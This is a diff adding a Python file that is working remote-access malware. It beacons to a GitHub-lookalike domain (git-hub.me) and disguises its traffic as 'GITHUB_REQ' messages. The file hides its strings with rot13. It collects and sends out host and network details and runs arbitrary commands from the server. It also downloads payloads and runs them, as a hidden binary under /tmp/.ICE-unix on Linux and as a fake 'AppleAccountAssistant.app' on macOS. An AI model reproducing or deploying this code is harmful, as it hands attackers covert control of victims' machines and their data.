@@ -1,0 +1,212 @@
+import string
+import requests
+import platform
+from time import sleep
+import base64
+import sys
+import tempfile
+from datetime import datetime
+import os
+import subprocess
+import getpass
+import codecs
+import random
+
+
+hdl_inp = 'rot13'
+
+def rand_n():
+    _LENGTH = 8
+    str_pool = "123456789"
+    result = ""
+    for i in range(_LENGTH):
+        result += random.choice(str_pool)
+    return result
+
+def basic_info(base_p, osn):
+    i_c = ""
+    p_i = ""
+    if osn == 0:
+        try:
+            res_p = subprocess.Popen(['ipconfig', '/all'], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.PIPE)
+            i_c = res_p.communicate()[0].decode('utf-8').split('\n')
+            res_p = subprocess.Popen(['tasklist', '/svc'], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.PIPE)
+            p_i = res_p.communicate()[0].decode('utf-8').split('\n')
+        except:
+            pass
+    else:
+        try:
+            res_p = subprocess.Popen(['ifconfig', '-a'], preexec_fn=os.setpgrp, stdout=subprocess.PIPE)
+            i_c = res_p.communicate()[0].decode('utf-8').split('\n')
+            res_p = subprocess.Popen(['ps', '-ef'], preexec_fn=os.setpgrp, stdout=subprocess.PIPE)
+            p_i = res_p.communicate()[0].decode('utf-8').split('\n')
+        except:
+            pass
+
+    base_f = open(base_p, 'w')
+
+    now = datetime.now()
+    c_t = now.strftime("%H:%M:%S")
+    base_f.write(codecs.decode('Pheerag Gvzr:\t', hdl_inp) + c_t + "\n")
+    base_f.write(codecs.decode('Hfreanzr:\t', hdl_inp) + getpass.getuser() + "\n")
+    base_f.write(codecs.decode('Ubfganzr:\t', hdl_inp) + platform.node() + "\n")
+    base_f.write(codecs.decode('BF Irefvba:\t', hdl_inp) + platform.platform() + "\n")
+
+    for item in i_c:
+        base_f.write(item + "\n")
+
+    for item in p_i:
+        base_f.write(item + "\n")
+    base_f.close()
+
+
+def cmd_exec(command, osn):
+    try:
+        if osn == 0:
+            result = subprocess.Popen(command, creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            return result.communicate()[0].decode('utf-8')
+        else:
+            result = subprocess.Popen(command, shell=True, preexec_fn=os.setpgrp, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            return result.communicate()[0].decode('utf-8')
+    except:
+        return "Unknown Error Occured!"
+
+
+def dist_name():
+    o_f = open(codecs.decode('/rgp/bf-eryrnfr', hdl_inp), 'r')
+    o_str = o_f.read()
+    o_f.close()
+    if o_str.find(codecs.decode('VQ_YVXR=qrovna', hdl_inp)) != -1:
+        return codecs.decode('qrovna', hdl_inp)
+    elif o_str.find(codecs.decode('VQ=qrovna', hdl_inp)) != -1:
+        return codecs.decode('qrovna', hdl_inp)
+    elif o_str.find(codecs.decode('VQ=srqben', hdl_inp)) != -1:
+        return codecs.decode('srqben', hdl_inp)
+    else:
+        return codecs.decode('bgure yvahk', hdl_inp)
+
+
+def down_exec(rcv_org, osn):
+    arg_lst = base64.b64decode(rcv_org.split("|", 1)[0]).decode('utf-8')
+    arg_org = base64.b64decode(rcv_org.split("|", 1)[1])
+    arg2 = arg_lst.split(":", 2)[1]
+    arg1 = arg_lst.split(":", 2)[0]
+
+    if check_os(osn) == 2:
+        de_path = tempfile.gettempdir() + codecs.encode('/gzc.p', hdl_inp)
+        de_file = open(de_path, 'wb')
+        de_file.write(arg_org)
+        de_file.close()
+        distro_info = dist_name()
+        if distro_info == codecs.decode('srqben', hdl_inp):
+            cmd_line = codecs.decode('pp -b /gzc/.VPR-havk/tvg ', hdl_inp) + de_path
+        elif distro_info == codecs.decode('qrovna', hdl_inp):
+            cmd_line = codecs.decode('tpp -b /gzc/.VPR-havk/tvg ', hdl_inp) + de_path + codecs.decode(' -yafy -ycguernq -yerfbyi -fgq=tah99', hdl_inp)
+        try:
+            subprocess.Popen(cmd_line, shell=True, preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            cmd_line = codecs.decode('/gzc/.VPR-havk/tvg ', hdl_inp) + arg1 + ' ' + arg2 + ' &'
+            sleep(5)
+            subprocess.Popen(cmd_line, shell=True, preexec_fn=os.setpgrp)
+        except:
+            pass
+    elif check_os(osn) == 1:
+        de_path = codecs.decode('/Hfref/Funerq', hdl_inp) + codecs.decode('/NccyrNppbhag.gtm', hdl_inp)
+        de_file = open(de_path, 'wb')
+        de_file.write(arg_org)
+        de_file.close()
+        sleep(1)
+        cmd_line = codecs.decode('gne mkis ', hdl_inp) + de_path + ' -C ' + codecs.decode('/Hfref/Funerq', hdl_inp)
+        try:
+            subprocess.Popen(cmd_line, shell=True, preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            cmd_line = codecs.decode('/Hfref/Funerq', hdl_inp) + codecs.decode('/GrzcHfre/NccyrNppbhagNffvfgnag.ncc', hdl_inp)
+            subprocess.Popen(['open', '-a', cmd_line], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+
+def check_os(osn):
+    if osn == codecs.decode('Jvaqbjf', hdl_inp):
+        return 0
+    elif osn == codecs.decode('Yvahk', hdl_inp):
+        return 2
+    elif osn == codecs.decode('Qnejva', hdl_inp):
+        return 1
+
+
+def drop_f(osn, uid):
+    if osn == 0:
+        d_path = tempfile.gettempdir() + '\\' + uid + '.dat'
+    else:
+        d_path = tempfile.gettempdir() + '/' + uid + '.dat'
+    d_file = open(d_path, 'w')
+    d_file.write("1")
+    d_file.close()
+
+
+if __name__ == '__main__':
+    filepath = ""
+    res_cmd = ""
+    res_base = ""
+    base_path = ""
+    uid = rand_n()
+    url = "https://www.git-hub.me/view.php"
+    headers = {"Content-Type": "application/json; charset=utf-8"}
+    os_inf = platform.system()
+    p_dt = "GITHUB_REQ" + str(uid) + "01" + "00" + str(check_os(os_inf)) + ""
+    drop_f(check_os(os_inf), uid)
+
+    while True:
+        try:
+            if res_cmd != "":
+                try:
+                    requests.post(url, headers=headers, data=res_cmd)
+                    res_cmd = ""
+                    sleep(60)
+                except requests.exceptions.RequestException as e:
+                    pass
+            if res_base != "":
+                try:
+                    requests.post(url, headers=headers, data=res_base)
+                    res_base = ""
+                    os.remove(base_path)
+                    sleep(60)
+                except requests.exceptions.RequestException as e:
+                    pass
+            response = requests.post(url, headers=headers, data=p_dt)
+            if response.status_code != 200:
+                sleep(60)
+                continue
+            else:
+                res = response.text
+                if len(res) > 11 and res.startswith("GITHUB_RES"):
+                    cmd_type = res[10:13]
+                    if cmd_type == "501":  # BasicInfo
+                        if check_os(os_inf) == 0:
+                            base_path = tempfile.gettempdir() + '\\b.dat'
+                        else:
+                            base_path = tempfile.gettempdir() + '/b.dat'
+                        basic_info(base_path, check_os(os_inf))
+                        f = open(base_path, 'r')
+                        results = f.read()
+                        f.close()
+                        res_b64 = base64.b64encode(bytes(results, 'utf-8'))
+                        res_base = "GITHUB_REQ" + str(uid) + "01" + "02" + str(check_os(os_inf)) + res_b64.decode('utf-8')
+                    elif cmd_type == "502":  # CmdExec
+                        cmdline = base64.b64decode(res[13:]).decode('utf-8')
+                        results = cmdline + '\n---------------------\n'
+                        results = results + cmd_exec(cmdline, check_os(os_inf))
+                        res_b64 = base64.b64encode(bytes(results, 'utf-8'))
+                        res_cmd = "GITHUB_REQ" + str(uid) + "01" + "01" + str(check_os(os_inf)) + res_b64.decode('utf-8')
+                    elif cmd_type == "503":  # DownExec
+                        res_txt = response.text
+                        if check_os(os_inf) != 0:
+                            down_exec(res_txt[13:], os_inf)
+                    elif cmd_type == "504":  # KillSelf
+                        exit(1)
+                    sleep(60)
+                else:
+                    sleep(60)
+                    continue
+        except requests.exceptions.RequestException as e:
+            sleep(60)
+            continue
